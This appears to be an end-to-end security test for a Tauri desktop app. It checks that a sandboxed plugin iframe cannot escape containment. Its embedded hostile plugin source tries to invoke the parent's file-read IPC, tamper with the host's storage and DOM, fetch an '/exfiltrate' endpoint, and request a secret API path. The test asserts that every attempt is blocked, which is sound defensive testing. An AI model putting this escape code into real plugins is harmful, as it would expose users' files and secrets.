/// <reference types="@wdio/globals/types" />
/// <reference types="@wdio/mocha-framework" />

import { createServer, type RequestListener, type Server } from 'node:http';
import { $, browser, expect } from '@wdio/globals';
import { build } from 'esbuild';
import { buildPluginHostFrameDocument } from '../../src-server/runtime/mcp/mcp-ui-frame-server.js';
import {
  E2E_STATION_CAPABILITIES,
  E2E_STATION_COMPATIBILITY,
} from '../helpers/current-station-contract.js';

const PLUGIN_NAME = 'hostile-plugin';
const DECLARED_SLUG = 'hostile-panel';
const PWNED_KEY = 'plugin-host-pwned';

type ListeningServer = {
  origin: string;
  server: Server;
};

type AttackHits = {
  blockedFetch: number;
  secretApi: number;
  requests: string[];
};

let remote: ListeningServer;
let frame: ListeningServer;
let blocked: ListeningServer;
let stationOrigin = 'tauri://localhost';
let hostileBundle = '';
const hits: AttackHits = { blockedFetch: 0, secretApi: 0, requests: [] };

function send(
  response: import('node:http').ServerResponse,
  status: number,
  body: string,
  contentType = 'application/json',
) {
  response.writeHead(status, {
    'Access-Control-Allow-Headers': '*',
    'Access-Control-Allow-Methods': 'GET,POST,OPTIONS',
    'Access-Control-Allow-Credentials': 'true',
    'Access-Control-Allow-Origin': stationOrigin,
    'Cache-Control': 'no-store',
    'Content-Type': contentType,
  });
  response.end(body);
}

function json(response: import('node:http').ServerResponse, value: unknown) {
  send(response, 200, JSON.stringify(value));
}

async function listen(
  port: number,
  handler: RequestListener,
): Promise<ListeningServer> {
  const server = createServer(handler);
  await new Promise<void>((resolve, reject) => {
    server.once('error', reject);
    server.listen(port, '127.0.0.1', () => resolve());
  });
  const address = server.address();
  if (!address || typeof address === 'string') {
    throw new Error('Tauri shell fixture did not receive a TCP port.');
  }
  return { origin: `http://127.0.0.1:${address.port}`, server };
}

async function close(server: Server | undefined) {
  if (!server) return;
  await new Promise<void>((resolve, reject) => {
    server.close((error) => (error ? reject(error) : resolve()));
  });
}

function paneCatalog() {
  const contribution = {
    id: `plugin:${PLUGIN_NAME}:${DECLARED_SLUG}`,
    version: '1.0.0',
    sourceIdentity: {
      id: PLUGIN_NAME,
      kind: 'remote',
      source: `plugins/${PLUGIN_NAME}`,
    },
    provenance: { origin: 'plugin', pluginId: PLUGIN_NAME },
  };
  return {
    projectId: 'project-hostile',
    descriptors: [
      {
        id: 'hostile-pane',
        name: 'Hostile plugin',
        provenance: contribution.provenance,
        description: 'hostile proof',
        renderer: { kind: 'plugin-component', name: DECLARED_SLUG },
        rendererId: 'hostile-renderer',
        rendererProvenance: contribution.provenance,
        placement: { supportedRegions: ['standalone'] },
        lifecycle: { stage: 'stable' },
        modes: [{ id: 'default' }],
      },
    ],
    instances: [
      {
        descriptorId: 'hostile-pane',
        instanceId: 'hostile-instance',
        version: '1.0.0',
        stateKey: 'hostile',
        boundContext: { projectId: 'project-hostile', contribution },
      },
    ],
    availability: [
      {
        descriptorId: 'hostile-pane',
        instanceId: 'hostile-instance',
        input: {
          rollout: 'available',
          distribution: 'enabled',
          renderer: 'unknown',
          context: {},
        },
      },
    ],
  };
}

const hostileProject = {
  id: 'project-hostile',
  slug: 'hostile',
  name: 'Hostile plugin proof',
  icon: 'H',
  description: 'Real Tauri plugin containment fixture',
  hasWorkingDirectory: false,
  layoutCount: 1,
  hasKnowledge: false,
  createdAt: '2026-08-29T00:00:00Z',
  updatedAt: '2026-08-29T00:00:00Z',
};

const hostileLayout = {
  id: 'layout-hostile-proof',
  slug: 'proof',
  projectSlug: hostileProject.slug,
  type: 'dashboard',
  name: 'Plugin containment proof',
  icon: 'H',
};

function remoteResponse(
  request: import('node:http').IncomingMessage,
  response: import('node:http').ServerResponse,
) {
  const pathname = new URL(request.url ?? '/', remote.origin).pathname;
  hits.requests.push(
    `${request.method ?? 'GET'} ${pathname} origin=${String(request.headers.origin ?? 'none')}`,
  );
  if (request.method === 'OPTIONS') return send(response, 204, '');
  if (pathname === '/.well-known/station/v1') {
    return json(response, {
      schemaVersion: 1,
      environmentId: '11111111-1111-4111-8111-111111111111',
      authentication: { scheme: 'bearer', protocolVersion: 1 },
      transports: { http: 1, sse: 1, websocket: 1 },
      compatibility: E2E_STATION_COMPATIBILITY,
      capabilities: E2E_STATION_CAPABILITIES,
    });
  }
  if (pathname === '/api/system/identity') {
    return json(response, {
      instanceId: 'tauri-plugin-security-proof',
      sha: '2222222222222222222222222222222222222222',
      bootId: 'tauri-plugin-security-proof-boot',
    });
  }
  if (pathname === '/api/system/status') {
    return json(response, {
      ready: true,
      acp: { connected: false, connections: [] },
      clis: {},
      prerequisites: [],
      providers: {
        configuredChatReady: true,
        configured: [],
        detected: { ollama: false, bedrock: false },
      },
    });
  }
  if (pathname === '/api/plugins') {
    return json(response, {
      plugins: [
        {
          name: PLUGIN_NAME,
          version: '1.0.0',
          hasBundle: true,
          layout: { slug: DECLARED_SLUG },
          permissions: { granted: ['network.fetch'] },
        },
      ],
    });
  }
  if (pathname === `/api/plugins/${PLUGIN_NAME}/bundle.js`) {
    return send(response, 200, hostileBundle, 'application/javascript');
  }
  if (pathname === `/api/plugins/${PLUGIN_NAME}/bundle.css`) {
    return send(response, 200, '', 'text/css');
  }
  if (pathname === '/api/secret') {
    hits.secretApi += 1;
    return json(response, { secret: 'should-not-be-reachable' });
  }
  if (pathname === '/api/config/app' || pathname === '/config/app') {
    return json(response, {
      success: true,
      data: { pluginFrameOrigin: frame.origin },
    });
  }
  if (pathname === '/api/projects/hostile/panes') {
    return json(response, { success: true, data: paneCatalog() });
  }
  if (pathname === '/api/usage-telemetry/disclosure') {
    return json(response, {
      success: true,
      data: { acknowledged: true, events: {} },
    });
  }
  if (pathname === '/api/auth/status') {
    return json(response, { authenticated: true });
  }
  if (pathname === '/api/branding') {
    return json(response, { success: true, data: {} });
  }
  if (pathname === '/api/projects') {
    return json(response, { success: true, data: [hostileProject] });
  }
  if (pathname === '/api/projects/hostile') {
    return json(response, { success: true, data: hostileProject });
  }
  if (pathname === '/api/projects/hostile/layouts') {
    return json(response, { success: true, data: [hostileLayout] });
  }
  if (pathname === '/api/projects/hostile/layouts/proof') {
    return json(response, {
      success: true,
      data: { ...hostileLayout, config: { tabs: [] } },
    });
  }
  if (pathname === '/api/events' || pathname === '/events') {
    return send(response, 204, '');
  }
  return json(response, { success: true, data: [] });
}

before(async () => {
  const remotePort = Number(process.env.STATION_TAURI_E2E_REMOTE_PORT);
  const framePort = Number(process.env.STATION_TAURI_E2E_FRAME_PORT);
  const blockedPort = Number(process.env.STATION_TAURI_E2E_BLOCKED_PORT);
  if (![remotePort, framePort, blockedPort].every(Number.isSafeInteger)) {
    throw new Error(
      'Tauri shell fixture ports were not supplied by the config.',
    );
  }
  blocked = await listen(blockedPort, (_request, response) => {
    hits.blockedFetch += 1;
    send(response, 200, 'blocked target reached', 'text/plain');
  });
  frame = await listen(framePort, (request, response) => {
    const pathname = new URL(request.url ?? '/', frame.origin).pathname;
    if (pathname !== '/plugin-host/frame') {
      return send(response, 404, 'Not found', 'text/plain');
    }
    return send(
      response,
      200,
      buildPluginHostFrameDocument('tauri-shell-proof', [stationOrigin]),
      'text/html',
    );
  });
  remote = await listen(remotePort, remoteResponse);
  const hostileSource = `
    let parentTauri = 'not-attempted';
    try {
      void window.parent.__TAURI_INTERNALS__.invoke('plugin:fs|read_file', {});
      parentTauri = 'reachable';
    } catch (error) {
      parentTauri = 'blocked:' + String(error && error.name);
    }
    document.documentElement.dataset.parentTauri = parentTauri;
    const ownTauri = typeof window.__TAURI_INTERNALS__;
    try { window.top.localStorage.setItem(${JSON.stringify(PWNED_KEY)}, '1'); } catch {}
    try { window.top.document.body.setAttribute('data-plugin-pwned', '1'); } catch {}
    try { fetch(${JSON.stringify(`${blocked.origin}/exfiltrate`)}).catch(() => {}); } catch {}
    window.parent.postMessage({ method: 'api-request', params: {
      id: 'over-scoped', permission: 'network.fetch', path: '/api/secret', method: 'POST'
    } }, '*');
    window.parent.postMessage({ method: 'navigate', params: { target: '/settings' } }, '*');
    window.parent.postMessage({ method: 'fill', params: {
      height: ownTauri === 'undefined' && parentTauri === 'blocked:SecurityError'
        ? 721
        : 999
    } }, '*');
    document.documentElement.dataset.hostileComplete = 'true';
    window.__station_ai_plugins = {
      [${JSON.stringify(PLUGIN_NAME)}]: {
        components: { [${JSON.stringify(DECLARED_SLUG)}]: () => null }
      }
    };
  `;
  const bundled = await build({
    stdin: { contents: hostileSource, loader: 'js' },
    bundle: true,
    format: 'iife',
    minify: true,
    write: false,
    platform: 'browser',
  });
  hostileBundle = bundled.outputFiles[0].text;
});

after(async () => {
  await Promise.all([
    close(remote?.server),
    close(frame?.server),
    close(blocked?.server),
  ]);
});

describe('isolated plugin inside a real Tauri WebView', () => {
  it('keeps the hostile frame IPC-blind and unable to mutate Station', async () => {
    // Station deliberately does not expose `window.__TAURI__`. Marking the
    // already-selected main handle as an explicit WebDriver choice disables
    // the service's optional focus probe, which otherwise waits for that less
    // hardened global before every element command.
    await browser.switchToWindow(await browser.getWindowHandle());
    await browser.waitUntil(
      async () =>
        (await browser.execute(() => document.readyState)) === 'complete',
      { timeout: 30_000, timeoutMsg: 'Tauri document did not become ready.' },
    );
    const mainBridge = await browser.execute(
      () =>
        typeof (window as unknown as { __TAURI_INTERNALS__?: unknown })
          .__TAURI_INTERNALS__,
    );
    expect(mainBridge).toBe('object');
    stationOrigin = await browser.execute(() =>
      window.location.origin === 'null'
        ? 'tauri://localhost'
        : window.location.origin,
    );
    await browser.execute(
      ({
        remoteOrigin,
        frameOrigin,
        pwnedKey,
      }: {
        remoteOrigin: string;
        frameOrigin: string;
        pwnedKey: string;
      }) => {
        localStorage.setItem('station:onboarding-setup-dismissed', '1');
        localStorage.removeItem(pwnedKey);
        localStorage.removeItem('station-connect-connections');
        localStorage.removeItem('station-connect-connections-active');
        localStorage.setItem(
          'station:plugin-registry:remote-bundles-allowed:station-profile:remote-plugin-proof',
          remoteOrigin,
        );
        localStorage.setItem('plugin-host-frame-origin', frameOrigin);
      },
      {
        remoteOrigin: remote.origin,
        frameOrigin: frame.origin,
        pwnedKey: PWNED_KEY,
      },
    );

    expect(
      await browser.execute(
        (key: string) => localStorage.getItem(key),
        PWNED_KEY,
      ),
    ).toBeNull();

    await browser.refresh();
    await browser.waitUntil(
      async () =>
        (await browser.execute(
          () =>
            typeof (window as unknown as { __TAURI_INTERNALS__?: unknown })
              .__TAURI_INTERNALS__,
        )) === 'object',
      {
        timeout: 20_000,
        timeoutMsg: 'Tauri core bridge did not return after fixture reload.',
      },
    );
    const manager = await $('[data-testid="app-toolbar-connection"]');
    await manager.waitForDisplayed({ timeout: 20_000 });
    await manager.click();
    const selectRemote = await $(
      'button[aria-label="Select remote-plugin-proof"]',
    );
    await selectRemote.waitForDisplayed({ timeout: 20_000 });
    await selectRemote.click();
    try {
      await browser.waitUntil(async () => hits.requests.length > 0, {
        timeout: 5_000,
        timeoutMsg: 'Selecting the remote profile made no handshake request.',
      });
    } catch (error) {
      const selectionState = await browser.execute(() => ({
        body: document.body.innerText.slice(0, 1_500),
        activeConnection: localStorage.getItem(
          'station-connect-connections-active',
        ),
      }));
      const nativeState = await browser.execute(async () => {
        const invoke = (
          window as unknown as {
            __TAURI_INTERNALS__: {
              invoke<T>(command: string): Promise<T>;
            };
          }
        ).__TAURI_INTERNALS__.invoke;
        return {
          profiles: await invoke<string>('station_profile_store_read'),
          bundled: await invoke<unknown>('bundled_server_status'),
        };
      });
      throw new Error(
        `Remote profile selection produced no request: ${JSON.stringify({
          ...selectionState,
          ariaPressed: await selectRemote.getAttribute('aria-pressed'),
          fixtureRequests: hits.requests,
          nativeState,
          remoteOrigin: remote.origin,
        })}`,
        { cause: error },
      );
    }
    const closeManager = await $('button[aria-label="Close Station manager"]');
    if (await closeManager.isDisplayed()) await closeManager.click();
    const panePath =
      '/projects/hostile/layouts/proof/panes/hostile-pane/hostile-instance';
    await browser.execute((path: string) => {
      (
        window as unknown as { __tauriShellErrors?: string[] }
      ).__tauriShellErrors = [];
      window.addEventListener('error', (event) => {
        (
          window as unknown as { __tauriShellErrors: string[] }
        ).__tauriShellErrors.push(String(event.error ?? event.message));
      });
      window.addEventListener('unhandledrejection', (event) => {
        (
          window as unknown as { __tauriShellErrors: string[] }
        ).__tauriShellErrors.push(String(event.reason));
      });
      window.history.pushState({}, '', path);
      window.dispatchEvent(new PopStateEvent('popstate'));
    }, panePath);
    // The embedded macOS driver executes element lookup on the WebView's main
    // loop. Give the lazy isolation chunk one command-free turn to resolve;
    // tight findElement polling can otherwise starve the very asset load it is
    // waiting to observe.
    await browser.pause(2_000);
    const outerFrameSelector = `iframe[title="Plugin: ${DECLARED_SLUG}"]`;
    try {
      await browser.waitUntil(
        async () =>
          await browser.execute(
            (selector: string) => Boolean(document.querySelector(selector)),
            outerFrameSelector,
          ),
        { timeout: 10_000, timeoutMsg: 'Plugin frame did not enter the DOM.' },
      );
    } catch (error) {
      const state = await browser.execute(() => ({
        body: document.body.innerText.slice(0, 2_000),
        iframes: [...document.querySelectorAll('iframe')].map((entry) => ({
          src: entry.src,
          title: entry.title,
        })),
        paneHtml:
          document
            .querySelector('.project-page__workspace-pane-route')
            ?.innerHTML.slice(0, 5_000) ?? null,
        errors:
          (window as unknown as { __tauriShellErrors?: string[] })
            .__tauriShellErrors ?? [],
        resources: performance
          .getEntriesByType('resource')
          .map((entry) => entry.name)
          .filter((name) => name.includes('PluginFrameHost')),
        location: window.location.href,
        activeConnection: localStorage.getItem(
          'station-connect-connections-active',
        ),
      }));
      throw new Error(
        `Hostile plugin frame did not mount: ${JSON.stringify({
          ...state,
          fixtureRequests: hits.requests,
        })}`,
        { cause: error },
      );
    }
    const outerFrame = await $(outerFrameSelector);
    await browser.waitUntil(
      async () =>
        Number.parseInt(
          String((await outerFrame.getCSSProperty('height')).value),
          10,
        ) === 721,
      {
        timeout: 20_000,
        timeoutMsg:
          'Hostile plugin did not report an IPC-blind, cross-origin frame.',
      },
    );
    expect(await outerFrame.getAttribute('sandbox')).toBe(
      'allow-scripts allow-same-origin',
    );

    expect(
      await browser.execute(
        (key: string) => localStorage.getItem(key),
        PWNED_KEY,
      ),
    ).toBeNull();
    expect(
      await browser.execute(() =>
        document.body.getAttribute('data-plugin-pwned'),
      ),
    ).toBeNull();
    expect(await browser.getUrl()).toContain(panePath);
    expect({
      blockedFetch: hits.blockedFetch,
      secretApi: hits.secretApi,
    }).toEqual({ blockedFetch: 0, secretApi: 0 });

    expect(
      await browser.execute(() =>
        Object.keys(
          (window as unknown as { __station_ai_plugins?: object })
            .__station_ai_plugins ?? {},
        ),
      ),
    ).not.toContain(PLUGIN_NAME);
  });
});
